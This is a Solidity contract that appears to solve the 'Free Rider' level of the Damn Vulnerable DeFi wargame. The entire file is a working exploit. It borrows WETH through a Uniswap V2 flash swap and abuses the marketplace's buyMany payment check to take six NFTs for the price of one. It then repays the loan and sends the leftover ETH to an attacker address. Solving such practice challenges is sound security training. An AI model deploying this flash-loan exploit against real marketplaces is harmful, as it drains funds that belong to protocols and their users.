// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IERC20.sol";

import "../free-rider/FreeRiderNFTMarketplace.sol";

interface IWETH {
    function balanceOf(address owner) external view returns (uint256 balance);

    function deposit() external payable;

    function withdraw(uint256 wad) external;

    function transfer(address to, uint256 value)
        external
        returns (bool success);
}

contract FreeRiderAttack is IUniswapV2Callee, IERC721Receiver {
    address buyerContract;
    address nft;
    address marketplace;
    address weth;
    address dvt;
    address uniswap;
    address attacker;
    uint256 NFTPrice = 15 ether;

    constructor(
        address _buyerContract,
        address _nft,
        address _marketplace,
        address _weth_token,
        address _dvt,
        address _uniswap,
        address _attacker
    ) {
        buyerContract = _buyerContract;
        nft = _nft;
        marketplace = _marketplace;
        weth = _weth_token;
        dvt = _dvt;
        uniswap = _uniswap;
        attacker = _attacker;
    }

    function attack() public {
        address pair = IUniswapV2Factory(uniswap).getPair(weth, dvt);
        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();

        uint256 amount0Out = weth == token0 ? NFTPrice : 0;
        uint256 amount1Out = weth == token1 ? NFTPrice : 0;
        bytes memory len_1_data = abi.encode(1);

        // https://docs.uniswap.org/protocol/V2/guides/smart-contract-integration/using-flash-swaps
        IUniswapV2Pair(pair).swap(
            amount0Out,
            amount1Out,
            address(this),
            len_1_data
        );

        for (uint256 i = 0; i < 6; i++) {
            DamnValuableNFT(nft).safeTransferFrom(
                address(this),
                buyerContract,
                i
            );
        }
        payable(attacker).transfer(address(this).balance);
    }

    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external override {
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        assert(
            msg.sender == IUniswapV2Factory(uniswap).getPair(token0, token1)
        );
        uint[] memory tokenIds = new uint[](6);
        for (uint i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
        IWETH(weth).withdraw(IWETH(weth).balanceOf(address(this)));
        FreeRiderNFTMarketplace(payable(marketplace)).buyMany{value: NFTPrice}(
            tokenIds
        );

        uint256 fee = (NFTPrice * 31) / 10000;
        uint256 repayment = NFTPrice + fee;
        IWETH(weth).deposit{value: repayment}();
        IWETH(weth).transfer(msg.sender, repayment);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
